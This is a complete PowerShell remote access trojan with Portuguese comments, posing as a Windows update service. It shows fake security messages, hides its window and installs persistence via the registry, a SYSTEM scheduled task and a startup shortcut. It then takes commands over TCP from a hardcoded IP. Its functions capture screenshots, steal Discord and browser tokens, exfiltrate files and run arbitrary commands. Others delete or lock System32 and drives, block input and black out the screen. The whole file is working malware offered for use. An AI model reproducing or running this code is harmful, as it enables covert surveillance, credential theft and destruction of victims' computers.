<#
.SYNOPSIS
Windows Critical System Component - Complete Edition
.DESCRIPTION
Funções completas para controle remoto e destruição
.NOTES
Versão: 10.0.19045.1 - Ultimate Edition
#>

# ===== CONFIGURACOES =====
$serverIP = "198.1.195.194"  # MUDE PARA SEU IP
$serverPort = 4000
$installName = "WinUpdateSvc"
$mutexName = "Global\MicrosoftWindowsUpdateService"
$registryPath = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\WinUpdateSvc"
$userListFile = "$env:ProgramData\Microsoft\Windows\Caches\users.dat"
$debugLog = "$env:TEMP\rat_debug.log"
$scriptPath = "$env:ProgramData\Microsoft\Windows\Caches\$installName.ps1"

# ===== MUTEX - EVITA MULTIPLAS INSTANCIAS =====
$mutex = New-Object System.Threading.Mutex($false, $mutexName)
if (-not $mutex.WaitOne(0, $false)) { exit }

# ===== VERIFICAR ADMIN =====
if (-not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    Write-Host "ERRO: Execute como Administrador!" -ForegroundColor Red
    Start-Sleep -Seconds 5
    exit
}

# ===== FUNÇÃO DE LOG PARA DIAGNÓSTICO =====
function Write-DebugLog {
    param([string]$Message)
    $timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
    "$timestamp - $Message" | Out-File -FilePath $debugLog -Append
}

# ===== FUNÇÕES DE USUÁRIO =====
function Remove-UserFromRAT {
    param([string]$UserName)
    try {
        $removido = $false
        if (Test-Path $registryPath) { Remove-Item -Path $registryPath -Recurse -Force -ErrorAction SilentlyContinue; $removido = $true }
        if (Test-Path $userListFile) { 
            $users = Get-Content $userListFile -ErrorAction SilentlyContinue
            $users = $users | Where-Object { $_ -ne $UserName }
            $users | Set-Content $userListFile -Force
            $removido = $true
        }
        $tasks = Get-ScheduledTask -TaskPath "\" -ErrorAction SilentlyContinue | Where-Object { $_.TaskName -like "*$installName*" }
        foreach ($task in $tasks) {
            Unregister-ScheduledTask -TaskName $task.TaskName -Confirm:$false -ErrorAction SilentlyContinue
            $removido = $true
        }
        if ($removido) { return "USUARIO_REMOVIDO" } else { return "USUARIO_NAO_ENCONTRADO" }
    } catch { 
        Write-DebugLog "Erro em Remove-UserFromRAT: $_"
        return "ERRO_AO_REMOVER" 
    }
}

function Get-RATUsers {
    try {
        $users = @()
        if (Test-Path $userListFile) { $users = Get-Content $userListFile -ErrorAction SilentlyContinue }
        if ($users.Count -eq 0) { return "Nenhum usuário encontrado" }
        return "USUARIOS:" + ($users -join "`n")
    } catch { 
        Write-DebugLog "Erro em Get-RATUsers: $_"
        return "ERRO_AO_LISTAR" 
    }
}

function Add-UserToList {
    param([string]$UserName)
    try {
        New-Item -ItemType Directory -Path "$env:ProgramData\Microsoft\Windows\Caches" -Force | Out-Null
        Add-Content -Path $userListFile -Value $UserName -Force
        New-Item -Path $registryPath -Force | Out-Null
        Set-ItemProperty -Path $registryPath -Name "UserName" -Value $UserName -Force
        Set-ItemProperty -Path $registryPath -Name "InstallDate" -Value (Get-Date).ToString() -Force
        return $true
    } catch { 
        Write-DebugLog "Erro em Add-UserToList: $_"
        return $false 
    }
}

$currentUser = "$env:COMPUTERNAME@$env:USERNAME"
$userExecuted = $false
if (Test-Path $userListFile) {
    $users = Get-Content $userListFile -ErrorAction SilentlyContinue
    if ($users -contains $currentUser) { $userExecuted = $true }
}
if (-not $userExecuted) { Add-UserToList $currentUser }

# ===== LOGS FAKES =====
Write-Host ""
Write-Host "==================================================" -ForegroundColor Cyan
Write-Host "    WINDOWS SECURITY MODULE" -ForegroundColor Cyan
Write-Host "==================================================" -ForegroundColor Cyan
Write-Host ""
Start-Sleep -Seconds 1
Write-Host "[$(Get-Date -Format 'HH:mm:ss')] Inicializando..." -ForegroundColor Gray
Start-Sleep -Milliseconds 500
Write-Host "[$(Get-Date -Format 'HH:mm:ss')] Verificando integridade..." -ForegroundColor Gray
Start-Sleep -Milliseconds 500
Write-Host "[$(Get-Date -Format 'HH:mm:ss')] Sistema seguro" -ForegroundColor Green
Start-Sleep -Seconds 2

# ===== ESCONDE JANELA =====
Add-Type -Name Window -Namespace Console -MemberDefinition @'
    [DllImport("Kernel32.dll")]
    public static extern IntPtr GetConsoleWindow();
    [DllImport("User32.dll")]
    public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
'@
$consolePtr = [Console.Window]::GetConsoleWindow()
[Console.Window]::ShowWindow($consolePtr, 0)

# ===== PERSISTÊNCIA MÚLTIPLA =====
function Install-Persistence {
    try {
        Write-DebugLog "Instalando persistência..."
        
        New-Item -ItemType Directory -Path "$env:ProgramData\Microsoft\Windows\Caches" -Force | Out-Null
        Copy-Item $MyInvocation.MyCommand.Path $scriptPath -Force
        Write-DebugLog "Script copiado para: $scriptPath"
        
        try {
            $regPath = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
            Set-ItemProperty -Path $regPath -Name $installName -Value "powershell.exe -NoProfile -WindowStyle Hidden -File `"$scriptPath`"" -Force
            Write-DebugLog "Persistência adicionada ao registro"
        } catch {
            Write-DebugLog "Erro ao adicionar ao registro: $_"
        }
        
        try {
            $action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-NoProfile -WindowStyle Hidden -File `"$scriptPath`""
            $trigger = New-ScheduledTaskTrigger -AtStartup
            $principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest
            Register-ScheduledTask -TaskName $installName -Action $action -Trigger $trigger -Principal $principal -Force
            Write-DebugLog "Persistência adicionada como tarefa agendada"
        } catch {
            Write-DebugLog "Erro ao criar tarefa agendada: $_"
        }
        
        try {
            $startupPath = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup"
            $shortcutPath = "$startupPath\$installName.lnk"
            $WScriptShell = New-Object -ComObject WScript.Shell
            $shortcut = $WScriptShell.CreateShortcut($shortcutPath)
            $shortcut.TargetPath = "powershell.exe"
            $shortcut.Arguments = "-NoProfile -WindowStyle Hidden -File `"$scriptPath`""
            $shortcut.Save()
            Write-DebugLog "Atalho adicionado à pasta de inicialização"
        } catch {
            Write-DebugLog "Erro ao criar atalho: $_"
        }
        
        attrib +h +s +r $scriptPath
        Write-DebugLog "Persistência instalada com sucesso"
    } catch {
        Write-DebugLog "Erro geral na instalação da persistência: $_"
    }
}

if (-not (Test-Path $scriptPath)) {
    Install-Persistence
}

# ===== FUNCOES BASICAS =====
Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing

# ===== CAPTURA DE TELA =====
function Get-ScreenCapture {
    try {
        $screen = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
        $bitmap = New-Object System.Drawing.Bitmap $screen.Width, $screen.Height
        $graphics = [System.Drawing.Graphics]::FromImage($bitmap)
        $graphics.CopyFromScreen($screen.Location, [System.Drawing.Point]::Empty, $screen.Size)
        $ms = New-Object System.IO.MemoryStream
        $bitmap.Save($ms, [System.Drawing.Imaging.ImageFormat]::Jpeg)
        $graphics.Dispose()
        $bitmap.Dispose()
        $base64 = [Convert]::ToBase64String($ms.ToArray())
        $ms.Dispose()
        Write-DebugLog "Screenshot capturado"
        return "SCREEN:$base64"
    } catch {
        Write-DebugLog "Erro ao capturar screenshot: $_"
        return "SCREEN_ERROR"
    }
}

# ===== MOUSE =====
function Move-Mouse { 
    param($x, $y)
    try {
        [System.Windows.Forms.Cursor]::Position = New-Object System.Drawing.Point([int]$x, [int]$y)
        return "OK"
    } catch { 
        Write-DebugLog "Erro ao mover mouse: $_"
        return "MOUSE_ERROR" 
    }
}

function Click-Mouse {
    try {
        [System.Windows.Forms.SendKeys]::SendWait("{ENTER}")
        return "OK"
    } catch { 
        Write-DebugLog "Erro ao clicar: $_"
        return "CLICK_ERROR" 
    }
}

function RightClick-Mouse {
    try {
        [System.Windows.Forms.SendKeys]::SendWait("+{F10}")
        return "OK"
    } catch { 
        Write-DebugLog "Erro ao clicar direito: $_"
        return "RIGHTCLICK_ERROR" 
    }
}

# ===== TECLADO =====
function Send-Key {
    param($key)
    try {
        [System.Windows.Forms.SendKeys]::SendWait($key)
        return "OK"
    } catch { 
        Write-DebugLog "Erro ao enviar tecla: $_"
        return "KEY_ERROR" 
    }
}

function Send-Text {
    param($text)
    try {
        [System.Windows.Forms.SendKeys]::SendWait($text)
        return "OK"
    } catch { 
        Write-DebugLog "Erro ao enviar texto: $_"
        return "TEXT_ERROR" 
    }
}

# ===== ARQUIVOS =====
function Get-FileList {
    param($Path)
    try {
        $items = Get-ChildItem $Path -ErrorAction SilentlyContinue | ForEach-Object {
            [PSCustomObject]@{
                Name = $_.Name
                Type = if ($_.PSIsContainer) { "PASTA" } else { "ARQUIVO" }
            }
        }
        return ($items | ConvertTo-Json -Compress)
    } catch { 
        Write-DebugLog "Erro ao listar arquivos: $_"
        return "[]" 
    }
}

function Download-File {
    param($Path)
    try {
        if (Test-Path $Path) {
            $content = [Convert]::ToBase64String([IO.File]::ReadAllBytes($Path))
            return "FILE:$content"
        }
        return "FILE_NOT_FOUND"
    } catch { 
        Write-DebugLog "Erro ao baixar arquivo: $_"
        return "DOWNLOAD_ERROR" 
    }
}

# ===== COMANDOS =====
function Execute-Command {
    param($Cmd)
    try {
        $result = Invoke-Expression $Cmd 2>&1 | Out-String
        return $result
    } catch {
        Write-DebugLog "Erro ao executar comando: $_"
        return "Erro: $_"
    }
}

# ===== DISCORD TOKEN =====
function Get-DiscordToken {
    try {
        $tokens = @()
        $paths = @(
            "$env:APPDATA\discord\Local Storage\leveldb",
            "$env:APPDATA\discordptb\Local Storage\leveldb",
            "$env:APPDATA\discordcanary\Local Storage\leveldb",
            "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Local Storage\leveldb",
            "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Local Storage\leveldb"
        )
        foreach ($path in $paths) {
            if (Test-Path $path) {
                Get-ChildItem "$path\*.ldb" -ErrorAction SilentlyContinue | ForEach-Object {
                    $content = Get-Content $_.FullName -Raw -ErrorAction SilentlyContinue
                    $regex = [regex]::new('[MN][A-Za-z\d]{23}\.[\w-]{6}\.[\w-]{27}|mfa\.[\w-]{84}')
                    $matches = $regex.Matches($content)
                    foreach ($match in $matches) { $tokens += $match.Value }
                }
            }
        }
        $tokens = $tokens | Select-Object -Unique
        if ($tokens.Count -eq 0) { return "TOKENS:Nenhum token encontrado" }
        Write-DebugLog "Tokens encontrados: $($tokens.Count)"
        return "TOKENS:" + ($tokens -join "`n")
    } catch {
        Write-DebugLog "Erro ao obter tokens: $_"
        return "TOKENS_ERROR"
    }
}

# ===== BLOQUEAR SYSTEM32 =====
function Block-System32 {
    try {
        Write-DebugLog "Iniciando Block-System32"
        $path = "C:\Windows\System32"
        
        takeown /f $path /r /d y 2>$null
        icacls $path /grant Administradores:F /t 2>$null
        
        $acl = Get-Acl $path
        $acl.SetAccessRuleProtection($true, $false)
        $accessRule = New-Object System.Security.AccessControl.FileSystemAccessRule("Everyone", "FullControl", "Deny")
        $acl.AddAccessRule($accessRule)
        Set-Acl $path $acl
        
        Write-DebugLog "System32 bloqueado com sucesso"
        return "SYSTEM32_BLOCKED"
    } catch {
        Write-DebugLog "Erro ao bloquear System32: $_"
        return "SYSTEM32_ERROR"
    }
}

# ===== APAGAR SYSTEM32 =====
function Delete-System32 {
    try {
        Write-DebugLog "Iniciando Delete-System32"
        $path = "C:\Windows\System32"
        
        if (Test-Path $path) {
            takeown /f $path /r /d y 2>$null
            icacls $path /grant Administradores:F /t 2>$null
            
            Remove-Item -Path $path -Recurse -Force -ErrorAction SilentlyContinue
            
            if (-not (Test-Path $path)) {
                Write-DebugLog "System32 apagado com sucesso"
                return "SYSTEM32_DELETED"
            } else {
                $newName = "C:\Windows\System32_old_$(Get-Random)"
                Rename-Item -Path $path -NewName $newName -Force -ErrorAction SilentlyContinue
                if (-not (Test-Path $path)) {
                    Write-DebugLog "System32 renomeado com sucesso"
                    return "SYSTEM32_RENAMED"
                } else {
                    return "SYSTEM32_DELETE_FAILED"
                }
            }
        } else {
            return "SYSTEM32_NOT_FOUND"
        }
    } catch {
        Write-DebugLog "Erro ao apagar System32: $_"
        return "SYSTEM32_ERROR"
    }
}

# ===== TRAVAR DISCOS =====
function Lock-Drives {
    param([string[]]$Drives = @("C:", "D:"))
    $results = @()
    foreach ($drive in $Drives) {
        try {
            Write-DebugLog "Travando drive ${drive}"
            $path = "${drive}\"
            if (Test-Path $path) {
                $acl = Get-Acl $path
                $acl.SetAccessRuleProtection($true, $false)
                $accessRule = New-Object System.Security.AccessControl.FileSystemAccessRule("Everyone", "Read", "Deny")
                $acl.AddAccessRule($accessRule)
                $accessRule2 = New-Object System.Security.AccessControl.FileSystemAccessRule("Everyone", "Write", "Deny")
                $acl.AddAccessRule($accessRule2)
                Set-Acl $path $acl
                
                $results += "${drive} travado"
                Write-DebugLog "Drive ${drive} travado"
            } else {
                $results += "${drive} não encontrado"
                Write-DebugLog "Drive ${drive} não encontrado"
            }
        } catch {
            Write-DebugLog "Erro ao travar drive ${drive}: $($_.Exception.Message)"
            $results += "${drive} erro"
        }
    }
    return "DRIVES_LOCKED:" + ($results -join ";")
}

# ===== LIBERAR DISCOS =====
function Unlock-Drives {
    param([string[]]$Drives = @("C:", "D:"))
    $results = @()
    foreach ($drive in $Drives) {
        try {
            Write-DebugLog "Liberando drive ${drive}"
            $path = "${drive}\"
            
            if (Test-Path $path) {
                $acl = Get-Acl $path
                $acl.SetAccessRuleProtection($false, $true)
                
                $rulesToRemove = @()
                foreach ($rule in $acl.Access) {
                    if ($rule.IdentityReference -eq "Everyone" -and $rule.AccessControlType -eq "Deny") {
                        $rulesToRemove += $rule
                    }
                }
                
                foreach ($rule in $rulesToRemove) {
                    $acl.RemoveAccessRule($rule) | Out-Null
                }
                
                $accessRule = New-Object System.Security.AccessControl.FileSystemAccessRule("Everyone", "FullControl", "Allow")
                $acl.AddAccessRule($accessRule)
                Set-Acl $path $acl
                
                $results += "${drive} liberado"
                Write-DebugLog "Drive ${drive} liberado"
            } else {
                $results += "${drive} não encontrado"
                Write-DebugLog "Drive ${drive} não encontrado"
            }
        } catch {
            Write-DebugLog "Erro ao liberar drive ${drive}: $($_.Exception.Message)"
            $results += "${drive} erro"
        }
    }
    return "DRIVES_UNLOCKED:" + ($results -join ";")
}

# ===== TELA PRETA =====
$global:blackScreenForm = $null

function Black-Screen {
    try {
        $ps = [powershell]::Create()
        [void]$ps.AddScript({
            Add-Type -AssemblyName System.Windows.Forms
            $form = New-Object System.Windows.Forms.Form
            $form.WindowState = 'Maximized'
            $form.FormBorderStyle = 'None'
            $form.TopMost = $true
            $form.BackColor = 'Black'
            $form.ControlBox = $false
            $form.ShowInTaskbar = $false
            $form.KeyPreview = $true
            $form.Add_KeyDown({
                if ($_.KeyCode -eq 'Escape') { $form.Close() }
            })
            $form.ShowDialog()
        })
        $ps.BeginInvoke()
        Write-DebugLog "Tela preta ativada"
        return "BLACK_SCREEN"
    } catch {
        Write-DebugLog "Erro ao ativar tela preta: $_"
        return "BLACK_SCREEN_ERROR"
    }
}

function Unlock-Screen {
    try {
        [System.Windows.Forms.Application]::OpenForms | Where-Object { $_.BackColor -eq [System.Drawing.Color]::Black -and $_.WindowState -eq 'Maximized' } | ForEach-Object {
            $_.Invoke([Action]{ $_.Close() })
        }
        Write-DebugLog "Tela liberada"
        return "SCREEN_UNLOCKED"
    } catch {
        Write-DebugLog "Erro ao liberar tela: $_"
        return "UNLOCK_ERROR"
    }
}

# ===== TRAVAR MOUSE (CORRIGIDO - TODAS AS CHAVES BALANCEADAS) =====
$script:mouseLocked = $false
$script:lockThread = $null
$script:reinforceThread = $null
$script:clipCursorSuccess = $false

function Lock-Mouse {
    try {
        if ($script:mouseLocked) { return "MOUSE_ALREADY_LOCKED" }
        
        Write-DebugLog "=" * 60
        Write-DebugLog "INICIANDO TRAVAMENTO DO MOUSE"
        Write-DebugLog "=" * 60
        
        $script:mouseLocked = $true
        
        # CAMADA 1: ClipCursor (API nativa)
        try {
            $cSharpCode = @'
using System;
using System.Runtime.InteropServices;
using System.Windows.Forms;
public class MouseLocker {
    [DllImport("user32.dll")]
    public static extern bool ClipCursor(ref RECT lpRect);
    
    [DllImport("user32.dll")]
    public static extern bool SetCursorPos(int x, int y);
    
    [DllImport("user32.dll")]
    public static extern int ShowCursor(bool bShow);
    
    [StructLayout(LayoutKind.Sequential)]
    public struct RECT {
        public int left, top, right, bottom;
    }
    
    public static void Lock() {
        RECT rect = new RECT();
        rect.left = 0;
        rect.top = 0;
        rect.right = 1;
        rect.bottom = 1;
        ClipCursor(ref rect);
        SetCursorPos(0, 0);
        ShowCursor(false);
    }
    
    public static void Unlock() {
        RECT rect = new RECT();
        rect.left = 0;
        rect.top = 0;
        rect.right = Screen.PrimaryScreen.Bounds.Width;
        rect.bottom = Screen.PrimaryScreen.Bounds.Height;
        ClipCursor(ref rect);
        ShowCursor(true);
    }
}
'@
            Add-Type -TypeDefinition $cSharpCode -ReferencedAssemblies "System.Windows.Forms.dll" -ErrorAction Stop
            [MouseLocker]::Lock()
            $script:clipCursorSuccess = $true
            Write-DebugLog "✓ ClipCursor aplicado com sucesso"
        } catch {
            Write-DebugLog "✗ Falha no ClipCursor: $_"
            $script:clipCursorSuccess = $false
        }
        
        # CAMADA 2: Thread de movimento constante
        Write-DebugLog "CAMADA 2: Iniciando thread de movimento constante"
        $script:lockThread = [System.Threading.Thread]::new({
            while ($script:mouseLocked) {
                try {
                    [System.Windows.Forms.Cursor]::Position = New-Object System.Drawing.Point(0, 0)
                    Start-Sleep -Milliseconds 1
                } catch {
                    # Ignora erros
                }
            }
        })
        $script:lockThread.IsBackground = $true
        $script:lockThread.Start()
        Write-DebugLog "✓ Thread de movimento iniciada"
        
        # CAMADA 3: Reforço do ClipCursor
        if ($script:clipCursorSuccess) {
            Write-DebugLog "CAMADA 3: Iniciando thread de reforço do ClipCursor"
            $script:reinforceThread = [System.Threading.Thread]::new({
                while ($script:mouseLocked) {
                    try {
                        [MouseLocker]::Lock()
                        Start-Sleep -Milliseconds 100
                    } catch {
                        # Ignora erros
                    }
                }
            })
            $script:reinforceThread.IsBackground = $true
            $script:reinforceThread.Start()
            Write-DebugLog "✓ Thread de reforço iniciada"
        }
        
        # CAMADA 4: Bloqueio de eventos
        try {
            $blockInputCode = @'
using System;
using System.Runtime.InteropServices;
public class InputBlocker {
    [DllImport("user32.dll")]
    public static extern bool BlockInput(bool fBlockIt);
    
    public static void Block() {
        BlockInput(true);
    }
    
    public static void Unblock() {
        BlockInput(false);
    }
}
'@
            Add-Type -TypeDefinition $blockInputCode -ErrorAction SilentlyContinue
            [InputBlocker]::Block()
            Write-DebugLog "✓ Bloqueio de eventos aplicado"
        } catch {
            Write-DebugLog "✗ Falha no bloqueio de eventos: $_"
        }
        
        Write-DebugLog "=" * 60
        Write-DebugLog "TRAVAMENTO DO MOUSE CONCLUÍDO"
        Write-DebugLog "=" * 60
        
        return "MOUSE_LOCKED"
    } catch {
        Write-DebugLog "❌ ERRO CRÍTICO em Lock-Mouse: $_"
        return "MOUSE_LOCK_ERROR"
    }
}

function Unlock-Mouse {
    try {
        Write-DebugLog "=" * 60
        Write-DebugLog "INICIANDO LIBERAÇÃO DO MOUSE"
        Write-DebugLog "=" * 60
        
        $script:mouseLocked = $false
        
        # Libera ClipCursor
        if ($script:clipCursorSuccess) {
            try {
                [MouseLocker]::Unlock()
                Write-DebugLog "✓ ClipCursor liberado"
            } catch {
                Write-DebugLog "✗ Erro ao liberar ClipCursor: $_"
            }
        }
        
        # Libera bloqueio de eventos
        try {
            [InputBlocker]::Unblock()
            Write-DebugLog "✓ Bloqueio de eventos liberado"
        } catch {
            Write-DebugLog "✗ Erro ao liberar bloqueio de eventos: $_"
        }
        
        # Para threads
        if ($script:lockThread -and $script:lockThread.IsAlive) {
            $script:lockThread.Abort()
            Write-DebugLog "✓ Thread de movimento abortada"
        }
        
        if ($script:reinforceThread -and $script:reinforceThread.IsAlive) {
            $script:reinforceThread.Abort()
            Write-DebugLog "✓ Thread de reforço abortada"
        }
        
        # Força liberação
        try {
            Add-Type -AssemblyName System.Windows.Forms
            [System.Windows.Forms.Cursor]::Clip = New-Object System.Drawing.Rectangle(0, 0, [System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Width, [System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Height)
            [System.Windows.Forms.Cursor]::Show()
            Write-DebugLog "✓ Cursor liberado via Cursor.Clip"
        } catch {
            Write-DebugLog "✗ Erro ao forçar liberação: $_"
        }
        
        Write-DebugLog "=" * 60
        Write-DebugLog "LIBERAÇÃO DO MOUSE CONCLUÍDA"
        Write-DebugLog "=" * 60
        
        return "MOUSE_UNLOCKED"
    } catch {
        Write-DebugLog "❌ ERRO CRÍTICO em Unlock-Mouse: $_"
        return "MOUSE_UNLOCK_ERROR"
    }
}

# ===== MICROFONE =====
function Get-Microphone {
    try {
        Add-Type -AssemblyName System.Speech
        $speech = New-Object System.Speech.Recognition.SpeechRecognitionEngine
        $speech.SetInputToDefaultAudioDevice()
        $speech.RecognizeAsyncTimeout = 5000
        $speech.RecognizeAsync()
        Start-Sleep -Seconds 5
        $speech.RecognizeAsyncStop()
        Write-DebugLog "Microfone gravado"
        return "AUDIO:OK"
    } catch {
        Write-DebugLog "Erro no microfone: $_"
        return "AUDIO_ERROR"
    }
}

# ===== WEBCAM =====
function Get-Webcam {
    try {
        Add-Type -AssemblyName System.Windows.Forms
        Add-Type -AssemblyName System.Drawing
        
        $webcam = New-Object System.Windows.Forms.Panel
        $webcam.Size = New-Object System.Drawing.Size(640, 480)
        $webcam.BackColor = 'Black'
        
        $form = New-Object System.Windows.Forms.Form
        $form.Text = "Webcam"
        $form.Size = New-Object System.Drawing.Size(660, 520)
        $form.Controls.Add($webcam)
        $form.Show()
        $form.TopMost = $true
        
        Start-Sleep -Milliseconds 500
        $form.Close()
        
        Write-DebugLog "Webcam ativada"
        return "WEBCAM:OK"
    } catch {
        Write-DebugLog "Erro na webcam: $_"
        return "WEBCAM_ERROR"
    }
}

# ===== PROCESSOS =====
function Get-ProcessList {
    try {
        $processes = Get-Process | Select-Object -First 20 Name | ConvertTo-Json -Compress
        return $processes
    } catch {
        Write-DebugLog "Erro ao listar processos: $_"
        return "PROCESS_ERROR"
    }
}

# ===== URL =====
function Open-Url {
    param($url)
    try {
        Start-Process $url
        Write-DebugLog "URL aberta: $url"
        return "URL_OPENED"
    } catch {
        Write-DebugLog "Erro ao abrir URL: $_"
        return "URL_ERROR"
    }
}

# ===== ENERGIA =====
function Power-Control {
    param($Action)
    try {
        switch ($Action) {
            "shutdown" { Stop-Computer -Force }
            "reboot" { Restart-Computer -Force }
        }
        Write-DebugLog "Comando de energia: $Action"
        return "POWER_$Action"
    } catch { 
        Write-DebugLog "Erro no comando de energia: $_"
        return "POWER_ERROR" 
    }
}

# ===== CONEXAO PRINCIPAL =====
while ($true) {
    try {
        $client = New-Object System.Net.Sockets.TcpClient($serverIP, $serverPort)
        $stream = $client.GetStream()
        $writer = New-Object System.IO.StreamWriter($stream)
        $reader = New-Object System.IO.StreamReader($stream)
        $writer.AutoFlush = $true
        
        $writer.WriteLine("$env:COMPUTERNAME@$env:USERNAME")
        Write-DebugLog "Conectado ao servidor"
        
        while ($client.Connected) {
            $cmd = $reader.ReadLine()
            if ([string]::IsNullOrEmpty($cmd)) { continue }
            
            Write-DebugLog "Comando recebido: $cmd"
            
            if ($cmd -eq "screenshot") {
                $result = Get-ScreenCapture
                $writer.WriteLine($result)
            } elseif ($cmd -eq "click") {
                $writer.WriteLine((Click-Mouse))
            } elseif ($cmd -eq "rightclick") {
                $writer.WriteLine((RightClick-Mouse))
            } elseif ($cmd -eq "discord") {
                $writer.WriteLine((Get-DiscordToken))
            } elseif ($cmd -eq "block_system32") {
                $result = Block-System32
                $writer.WriteLine($result)
            } elseif ($cmd -eq "delete_system32") {
                $result = Delete-System32
                $writer.WriteLine($result)
            } elseif ($cmd -eq "lock_drives") {
                $result = Lock-Drives
                $writer.WriteLine($result)
            } elseif ($cmd -eq "unlock_drives") {
                $result = Unlock-Drives
                $writer.WriteLine($result)
            } elseif ($cmd -eq "black_screen") {
                $writer.WriteLine((Black-Screen))
            } elseif ($cmd -eq "unlock_screen") {
                $writer.WriteLine((Unlock-Screen))
            } elseif ($cmd -eq "lock_mouse") {
                $result = Lock-Mouse
                Write-DebugLog "Resultado lock_mouse: $result"
                $writer.WriteLine($result)
            } elseif ($cmd -eq "unlock_mouse") {
                $result = Unlock-Mouse
                Write-DebugLog "Resultado unlock_mouse: $result"
                $writer.WriteLine($result)
            } elseif ($cmd -eq "mic") {
                $writer.WriteLine((Get-Microphone))
            } elseif ($cmd -eq "webcam") {
                $writer.WriteLine((Get-Webcam))
            } elseif ($cmd -eq "processes") {
                $writer.WriteLine((Get-ProcessList))
            } elseif ($cmd -eq "shutdown") {
                $writer.WriteLine((Power-Control "shutdown"))
            } elseif ($cmd -eq "reboot") {
                $writer.WriteLine((Power-Control "reboot"))
            } elseif ($cmd -eq "list_users") {
                $writer.WriteLine((Get-RATUsers))
            } elseif ($cmd -eq "remove_current_user") {
                $writer.WriteLine((Remove-UserFromRAT $currentUser))
            } elseif ($cmd -eq "test") {
                $writer.WriteLine("PONG")
            } elseif ($cmd -eq "exit") {
                break
            } elseif ($cmd -match "^move (\d+) (\d+)$") {
                $writer.WriteLine((Move-Mouse $matches[1] $matches[2]))
            } elseif ($cmd -match "^key (.+)$") {
                $writer.WriteLine((Send-Key $matches[1]))
            } elseif ($cmd -match "^type (.+)$") {
                $writer.WriteLine((Send-Text $matches[1]))
            } elseif ($cmd -match "^ls (.+)$") {
                $writer.WriteLine((Get-FileList $matches[1]))
            } elseif ($cmd -match "^download (.+)$") {
                $writer.WriteLine((Download-File $matches[1]))
            } elseif ($cmd -match "^exec (.+)$") {
                $writer.WriteLine((Execute-Command $matches[1]))
            } elseif ($cmd -match "^url (.+)$") {
                $writer.WriteLine((Open-Url $matches[1]))
            } elseif ($cmd -match "^remove_user (.+)$") {
                $writer.WriteLine((Remove-UserFromRAT $matches[1]))
            } else {
                Write-DebugLog "Comando não reconhecido: $cmd"
                $writer.WriteLine("Comando nao reconhecido")
            }
        }
    } catch {
        Write-DebugLog "Erro na conexão: $_"
        Start-Sleep -Seconds 10
    } finally {
        if ($client) { $client.Close() }
    }
}

$mutex.ReleaseMutex()
$mutex.Dispose()
